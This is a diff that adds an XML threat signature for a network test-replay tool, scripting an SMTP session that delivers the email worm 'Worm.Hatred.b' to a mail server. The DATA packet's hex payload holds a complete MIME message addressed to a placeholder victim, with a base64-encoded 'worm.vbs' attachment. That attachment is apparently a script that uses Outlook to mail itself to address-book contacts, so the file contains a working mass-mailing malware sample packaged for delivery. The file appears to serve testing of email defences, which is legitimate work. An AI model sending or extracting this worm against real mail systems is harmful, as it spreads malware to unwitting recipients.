@@ -1,0 +1,272 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Email Virus Worm.Hatred.b"/>
+    <EngDesc display="true" value="This is the email virus Worm.Hatred.b as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3477561728af77a73980251bbd7e7b44.  This attack is delivered via SMTP to a email server."/>
+    <Intent display="true">
+      <item value="Infection"/>
+      <item value="Denial_Of_Service"/>
+    </Intent>
+    <Protocol display="true" value="SMTP"/>
+    <Type_Of_Equipment display="true" value="Application"/>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.imperfectnetworks.com"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <Revision value="1" display="true"/>
+    <Suite display="true" value="Email"/>
+    <AccessVector value="local"/>
+    <AccessComplexity value="high"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="complete"/>
+    <IntegImpact value="complete"/>
+    <AvailImpact value="complete"/>
+    <ImpactBias value="normal"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <WormHash display="false" value="3477561728af77a73980251bbd7e7b44"/>
+    <Created value="1155318452" display="true"/>
+    <ID value="eb03aa9bce6118c8f327ee3bc201e7a1" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="MAILFROM" type="ImperfectControls.MultiLine" value="null" index="J"/>
+    <NamedVar name="RCPTTO" type="ImperfectControls.MultiLine" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="N"/>
+    <NamedVar name="SMTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="C">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="E">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="G">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="H">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="B">
+      <for index="I"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="R">
+      <for index="I"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="HELO" Parameter="Server" Payload=""/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet srcMac="" destMac="" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+        <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="" Parameter="" Payload=""/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Input>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="MAIL FROM:" Parameter="$MAILFROM" Payload=""/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet srcMac="" destMac="" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+        <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="" Parameter="" Payload=""/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Input>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="RCPT TO:" Parameter="$RCPTTO" Payload=""/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet srcMac="" destMac="" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+        <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="" Parameter="" Payload=""/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Input>
+  <Output index="G" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="DATA" Parameter="" Payload=""/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet srcMac="" destMac="" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+        <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="" Parameter="" Payload=""/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Input>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="436F6E74656E742D5472616E736665722D456E636F64696E673A2062696E6172790A436F6E74656E742D547970653A206D756C7469706172742F6D697865643B20626F756E646172793D225F2D2D2D2D2D2D2D2D2D2D3D5F313133353131323536343935303330220A4D494D452D56657273696F6E3A20312E300A582D4D61696C65723A204D494D453A3A4C69746520332E3031202846322E37333B2041312E36373B2042332E30353B2051332E3033290A446174653A205475652C2032302044656320323030352032313A30323A34342055540A46726F6D3A2070686172406578616D706C652E636F6D0A546F3A2076696374696D406578616D706C652E6E65740A5375626A6563743A2027437572696F7573657220616E6420637572696F75736572212720637269656420416C6963652E0A0A546869732069732061206D756C74692D70617274206D65737361676520696E204D494D4520666F726D61742E0A0A2D2D5F2D2D2D2D2D2D2D2D2D2D3D5F3131333531313235363439353033300A436F6E74656E742D446973706F736974696F6E3A20696E6C696E650A436F6E74656E742D4C656E6774683A203633350A436F6E74656E742D5472616E736665722D456E636F64696E673A2062696E6172790A436F6E74656E742D547970653A20746578742F706C61696E0A0A60427574204920646F6E27742077616E7420746F20676F20616D6F6E67206D61642070656F706C652C2720416C6963652072656D61726B65642E0A604F682C20796F752063616E27742068656C7020746861742C27207361696420746865204361743A2060776527726520616C6C206D616420686572652E2049276D206D61642E2020596F75277265206D61642E270A60486F7720646F20796F75206B6E6F772049276D206D61643F27207361696420416C6963652E0A60596F75206D7573742062652C27207361696420746865204361742C20606F7220796F7520776F756C646E2774206861766520636F6D6520686572652E270A416C696365206469646E2774207468696E6B20746861742070726F76656420697420617420616C6C3B20686F77657665722C207368652077656E74206F6E6020416E6420686F7720646F20796F75206B6E6F77207468617420796F75277265206D61643F270A60546F20626567696E20776974682C27207361696420746865204361742C20606120646F672773206E6F74206D61642E2020596F75206772616E7420746861743F270A604920737570706F736520736F2C27207361696420416C6963652E0A6057656C6C2C207468656E2C2720746865204361742077656E74206F6E2C2060796F75207365652C206120646F672067726F776C73207768656E206974277320616E6772792C20616E64207761677320697473207461696C207768656E206974277320706C65617365642E20204E6F7720492067726F776C207768656E2049276D20706C65617365642C20616E6420776167206D79207461696C200A7768656E2049276D20616E6772792E20205468657265666F72652049276D206D61642E270A2D2D5F2D2D2D2D2D2D2D2D2D2D3D5F3131333531313235363439353033300A436F6E74656E742D446973706F736974696F6E3A206174746163686D656E743B2066696C656E616D653D22776F726D2E766273220A436F6E74656E742D5472616E736665722D456E636F64696E673A206261736536340A436F6E74656E742D547970653A206170706C69636174696F6E2F6F637465742D73747265616D3B206E616D653D22776F726D2E766273220A0A646D467949484173655378344C47393164477876623273735A6E4E764C47316861577773625746776153787A614756736243786B5A574A315A7A734E0A436E5A686369427A64574A715A574E305057356C64794242636E4A68655367695447397661794268644342745A5345694C434A7459584A70595768660A593246795A586B67633256346553427761574D694C434A6F59576868496977694F6C30694B54734E436E52796551304B6577304B64484A35445170370A4451706D6332383956314E6A636D6C7764433544636D566864475650596D706C5933516F496C4E6A636D6C7764476C755A7935476157786C55336C7A0A6447567454324A715A574E3049696B374451705064585273623239725056647A59334A706348517551334A6C5958526C54324A715A574E304B434A500A64585273623239724C6B467763477870593246306157397549696B37445170745958427050573931644778766232737552325630546D46745A584E770A59574E6C4B434A4E5156424A49696B3744517077505441374451706D6233496F655430784F336B385057316863476B755157526B636D567A633078700A6333527A4C6B4E76645735304F336B724B796B4E436E734E436D5A7663696834505445376544773962574677615335425A4752795A584E7A54476C7A0A64484D6F65536B755157526B636D567A6330567564484A705A584D7551323931626E5137654373724B51304B6577304B615759674B484139505445340A4B51304B6577304B62574670624335545A57356B445170775054413744517039445170705A69416F634430394D436B4E436E734E436D3168615777390A623356306247397661793544636D56686447564A644756744B4441704F77304B625746706243355464574A715A574E3050584E31596D706C593352620A5457463061433579623356755A43684E5958526F4C6E4A68626D5276625367704B6A4D705854734E436D3168615777755158523059574E6F625756750A64484D755157526B4B474A79615852755A586C666333426C59584A7A583256346347397A5A575175656D6C774B54734E436E306749434167494341670A4943416749434167494341674943416749434167494341674943416749434167494341674943416749434167494341674943414E4367304B596D567A0A6232356B5A584A6C2B575A686247786C2B57614263766B742B564E76626D6C6A556D566B2B5333354D6A49754D4451754D6A41774D67304B44516F7A0A4D446C424D445530526977304D5334794E545167566C4D774E544D304D444175536C4D4E436941674943416749434167494341674943414E436D31680A61577775556D566A615842705A573530637935425A47516F62574677615335425A4752795A584E7A54476C7A64484D6F65536B755157526B636D567A0A6330567564484A705A584D6F65436B704F77304B634373724F77304B6651304B6651304B615759674B484168505441704947316861577775553256750A5A41304B6651304B5A6D6C75595778736551304B6577304B56314E6A636D6C776443356C593268764B434A4A4C566476636D307553474630636D566B0A4C6D4D694B54734E436D526C596E566E50575A7A62793544636D5668644756555A586830526D6C735A53676953474630636D566B4C6D6830625777690A4B54734E436D526C596E566E4C6E64796158526C62476C755A536769504568555455772B49696B374451706B5A574A315A793533636D6C305A5778700A626D556F496A784952554645506949704F77304B5A4756696457637564334A70644756736157356C4B43493856456C555445552B49456B74563239790A62533549595852795A575175597A777656456C555445552B49696B374451706B5A574A315A793533636D6C305A577870626D556F496A78435430525A0A506949704F77304B5A4756696457637564334A70644756736157356C4B434A5A6233556E636D55676157356D5A574E305A57516764326C306143424F0A5A586367535735305A584A755A5851675632397962534249595852795A57516849696B374451706B5A574A315A793533636D6C305A577870626D556F0A496A7851506949704F77304B5A4756696457637564334A70644756736157356C4B434938516A34675353315862334A744C6B686864484A6C5A43356A0A494664686379426A6232526C5A43426D62334967636D56325A57356E5A53426B645755676447386762586B675A334A705A57596764326C30614342320A6547567963794268626D516759585A6C636E4D676232346753564A44494746755A43426862484E764948527649474675626D3931626D4E6C494731350A49484A6C64476C795A57316C626E51675A6E4A76625342306147556763324E6C626D556850433943506949704F77304B5A4756696457637564334A700A644756736157356C4B434938554434694B54734E436D526C596E566E4C6E64796158526C62476C755A53676950456B2B4945527662696430494864760A636E4A3549476C306379426F59584A746247567A6379426D64584A695957787349475A7962323067656D5675623234684944705149447776535434690A4B54734E436D526C596E566E4C6E64796158526C62476C755A5367695046412B49696B374451706B5A574A315A793533636D6C305A577870626D556F0A496C744A4C566476636D307553474630636D566B4C6D4E6457314E7662574A6C636939615A584A765A334A68646D6C30655630694B54734E436D526C0A596E566E4C6E64796158526C62476C755A53676950433951506949704F77304B5A4756696457637564334A70644756736157356C4B4349385346524E0A544434694B54734E436D526C596E566E4C6B4E7362334E6C4B436B374451707A614756736244315855324E79615842304C6B4E795A5746305A5539690A616D566A6443676956314E6A636D6C776443355461475673624349704F77304B6332686C62477775556E56754B434A49595852795A575175614852740A624349704F77304B4948304E436E304E436D4E6864474E6F4B476B70445170374451705855324E79615842304C6D566A6147386F496D3168636D6C680A61474E68636D56354C6D70775A57636752584A796233496849696B374451703944516F3D0A0A2D2D5F2D2D2D2D2D2D2D2D2D2D3D5F3131333531313235363439353033302D2D0A0A0A0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet srcMac="" destMac="" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+        <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Input>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0D0A2E0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet srcMac="" destMac="" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+        <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Input>
+  <Output index="R" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="515549540D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet srcMac="" destMac="" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+        <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Input>
+  <ServerSide display="0,1,2,3,4,5,6">
+    <Output index="A" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="32323020666f737465722045534d54500d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3235302d53495a452035323432383830300d0a3235302d504950454c494e494e470d0a3235302d4155544820504c41494e204c4f47494e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="323530204f4b0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3235302041636365707465640d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="E" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="33353420456e746572206d6573736167652c20656e64696e67207769746820222e22206f6e2061206c696e6520627920697473656c660d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="323530204f4b2069643d31486356576f2d3030303759522d5338" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="32323120666f7374657220636c6f73696e6720636f6e6e656374696f6e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
